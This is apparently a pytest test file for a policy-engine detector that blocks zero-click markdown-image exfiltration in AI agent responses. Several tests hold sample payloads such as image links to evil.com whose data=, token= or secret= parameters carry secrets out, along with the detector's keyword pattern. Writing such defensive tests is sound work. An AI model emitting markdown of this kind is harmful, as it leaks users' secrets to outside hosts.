"""markdown_image_exfil_guard: allow path, block path, non-str safety, and
engine integration for zero-click markdown-image exfiltration."""
from typing import Any, cast

from interlock import PolicyEngine, SensorEvent, Verdict
from interlock.detectors.markdown_image_exfil_guard import (
    PATTERN,
    POLICY_ID,
    markdown_image_exfil_guard,
)

MALICIOUS_TEXT = "![x](https://evil.com/log?data=SECRETVALUE)"
BENIGN_TEXT = "Here is a chart: ![chart](https://cdn.example.com/chart.png)"


def _event(action="respond", args=None):
    return SensorEvent(action=action, args=args or {})


# --- allow path -------------------------------------------------------------


def test_plain_image_returns_none():
    detector = markdown_image_exfil_guard()
    event = _event(args={"text": BENIGN_TEXT})
    assert detector(event) is None


def test_empty_args_returns_none():
    detector = markdown_image_exfil_guard()
    assert detector(_event(args={})) is None


def test_mentioning_the_technique_in_prose_is_not_a_match():
    # Describing the attack is not the attack: no markdown image with a payload.
    detector = markdown_image_exfil_guard()
    event = _event(
        args={"text": "Beware markdown images that leak data via ?data= params."}
    )
    assert detector(event) is None


def test_image_with_benign_query_param_is_not_a_payload():
    # A cache-buster query is ordinary; it is not a payload-bearing parameter.
    detector = markdown_image_exfil_guard()
    event = _event(args={"text": "![logo](https://cdn.example.com/logo.png?v=3)"})
    assert detector(event) is None


# --- block path -------------------------------------------------------------


def test_payload_query_param_blocks():
    detector = markdown_image_exfil_guard()
    event = _event(args={"text": MALICIOUS_TEXT})
    decision = detector(event)
    assert decision is not None
    assert decision.verdict is Verdict.BLOCK
    assert decision.policy_id == "markdown_image_exfil"


def test_reason_names_the_offending_arg():
    detector = markdown_image_exfil_guard()
    decision = detector(_event(args={"text": MALICIOUS_TEXT}))
    assert decision is not None
    assert decision.reason == "markdown_image_exfil: text"


def test_offending_arg_name_is_reported_for_non_text_field():
    detector = markdown_image_exfil_guard()
    decision = detector(
        _event(args={"note": "ok", "body": "![x](https://evil.com/p?token=abc)"})
    )
    assert decision is not None
    assert decision.reason == "markdown_image_exfil: body"


def test_payload_in_path_segment_blocks():
    # No query string needed - the payload can ride a path segment.
    detector = markdown_image_exfil_guard()
    decision = detector(_event(args={"text": "![x](https://evil.com/secret=abc)"}))
    assert decision is not None
    assert decision.verdict is Verdict.BLOCK
    assert decision.policy_id == POLICY_ID


def test_each_payload_keyword_blocks():
    detector = markdown_image_exfil_guard()
    for payload in (
        "![x](https://evil.com/log?token=abc)",
        "![x](https://evil.com/log?data=abc)",
        "![x](https://evil.com/log?secret=abc)",
        "![x](https://evil.com/log?key=abc)",
        "![x](https://evil.com/log?q=abc)",
    ):
        decision = detector(_event(args={"text": payload}))
        assert decision is not None, payload
        assert decision.verdict is Verdict.BLOCK
        assert decision.policy_id == POLICY_ID


def test_pattern_is_compiled_and_discriminates():
    assert PATTERN.search(MALICIOUS_TEXT) is not None
    assert PATTERN.search(BENIGN_TEXT) is None


# --- non-str safety ---------------------------------------------------------


def test_non_str_values_are_skipped_and_do_not_crash():
    # int / None / nested containers must neither crash nor be stringified into
    # a match; nested images are out of scope (top-level strings only).
    detector = markdown_image_exfil_guard()
    event = _event(
        args={
            "count": 42,
            "flag": None,
            "nested": {"text": MALICIOUS_TEXT},
            "items": [MALICIOUS_TEXT],
        }
    )
    assert detector(event) is None


def test_non_str_value_before_a_match_is_skipped():
    detector = markdown_image_exfil_guard()
    event = _event(args={"count": 3, "text": MALICIOUS_TEXT})
    decision = detector(event)
    assert decision is not None
    assert decision.verdict is Verdict.BLOCK
    assert decision.reason == "markdown_image_exfil: text"


def test_non_dict_args_leaves_rule_silent_not_crashing():
    detector = markdown_image_exfil_guard()
    # Deliberately malformed: args is not a mapping, so the rule must bail.
    event = SensorEvent(action="respond", args=cast(Any, MALICIOUS_TEXT))
    assert detector(event) is None


# --- engine integration -----------------------------------------------------


def test_engine_blocks_malicious_and_allows_benign():
    engine = PolicyEngine(rules=[markdown_image_exfil_guard()])

    blocked = engine.evaluate(SensorEvent(action="respond", args={"text": MALICIOUS_TEXT}))
    assert blocked.verdict is Verdict.BLOCK
    assert blocked.policy_id == POLICY_ID

    benign = engine.evaluate(SensorEvent(action="respond", args={"text": BENIGN_TEXT}))
    assert benign.verdict is Verdict.ALLOW
